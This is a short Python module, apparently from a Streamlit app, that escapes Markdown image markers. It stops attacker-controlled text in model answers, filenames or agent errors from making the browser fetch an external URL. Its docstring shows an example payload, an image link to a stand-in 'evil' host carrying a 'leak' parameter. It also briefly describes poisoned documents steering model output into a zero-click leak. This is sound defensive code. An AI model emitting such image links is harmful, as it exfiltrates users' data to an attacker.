"""Rendering untrusted text as Markdown without letting it load anything (AIGSEC-012).

Model answers, document filenames and agent errors can carry text an attacker chose (a poisoned
document, a colleague's filename). Rendered as Markdown, an image (`![x](https://evil/?leak=...)`)
is fetched by the browser the moment it is shown, with no click: a zero-click channel to leak
whatever the text was made to contain. Streamlit already refuses raw HTML (this app never passes
`unsafe_allow_html`), so images are the one Markdown construct that makes the browser load an
external resource on its own. `neutralize` escapes the image marker so the text is shown as
written; every other piece of formatting (bold, lists, code, links, which need a click) is kept.
"""

from __future__ import annotations

import re

# `![` starts an inline image (`![alt](url)`) and a reference image (`![alt][ref]`, `![ref]`).
_IMAGE_START = re.compile(r"!(?=\[)")


def neutralize(text: str) -> str:
    """The same text, with every Markdown image turned into literal text."""
    return _IMAGE_START.sub(r"!\\", text)
